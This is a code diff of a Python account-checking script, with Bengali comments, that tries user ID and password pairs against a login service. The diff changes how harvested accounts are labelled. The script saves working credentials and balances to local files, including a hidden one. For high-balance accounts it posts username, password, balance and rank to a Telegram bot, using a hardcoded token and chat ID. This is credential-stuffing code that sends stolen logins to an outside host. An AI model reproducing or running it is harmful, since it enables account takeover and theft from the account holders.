@@ -1,3 +1,4 @@
+
 import os
 import json
 import time
@@ -75,16 +76,6 @@ def get_balance_value(balance):
     except:
         return 0
 
-def extract_username(user_id):
-    """UID থেকে শুধু ইউজারনেম পার্ট নেয়া"""
-    if '@' in user_id:
-        return user_id.split('@')[0]
-    elif '+' in user_id:
-        parts = user_id.split('+')
-        return parts[0] if len(parts) > 0 else user_id
-    else:
-        return user_id
-
 def attempt_login(user_id, pw):
     global successful_users
     with lock:
@@ -119,9 +110,6 @@ def attempt_login(user_id, pw):
                 balance = get_balance_deep(data)
                 level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data.get('userId', user_id)
-                
-                # শুধু ইউজারনেম এক্সট্রাক্ট করছি
-                username = extract_username(uid)
 
                 with lock: successful_users.add(user_id)
                 
@@ -134,7 +122,7 @@ def attempt_login(user_id, pw):
                 bal_val = get_balance_value(balance)
                 
                 if bal_val >= 1000:
-                    send_telegram(username, pw, balance, level)  # ইউজারনেম টেলিগ্রামে পাঠানো
+                    send_telegram(uid, pw, balance, level)
                     if bal_val >= 10000: 
                         earn = '100 BDT'
                         color = C
@@ -142,15 +130,14 @@ def attempt_login(user_id, pw):
                         earn = '50 BDT'
                         color = G
 
-                # শুধু ইউজারনেম প্রিন্ট করা
-                print(f'{BOLD}{color} {username} | Profile : {status} | Earned : {earn} {D}')
+                print(f'{BOLD}{color} {CX} | Profile : {status} | Earned : {earn} {D}')
 
                 with open(filename, 'a', encoding='utf-8') as f:
-                    f.write(f'{username} | {pw} | Balance: {balance} | Rank: {level}\n')
+                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
                     
                 if bal_val > 0:
                     with open('.balances.txt', 'a', encoding='utf-8') as f:
-                        f.write(f'{username} | {pw} | {balance} | {level}\n')
+                        f.write(f'{uid} | {pw} | {balance} | {level}\n')
 
             elif res.get('status') == 'S0001': 
                 time.sleep(10)
@@ -159,10 +146,10 @@ def attempt_login(user_id, pw):
     except Exception as e:
         pass
 
-def send_telegram(username, pw, balance, level):
+def send_telegram(uid, pw, balance, level):
     token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
     cid = '-1003275746200'
-    msg = f'🔥 [CX HIT 1000+]\n👤 User: `{username}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
+    msg = f'🔥 [CX HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
     try: 
         requests.post(f'https://api.telegram.org/bot{token}/sendMessage', 
                      json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'},
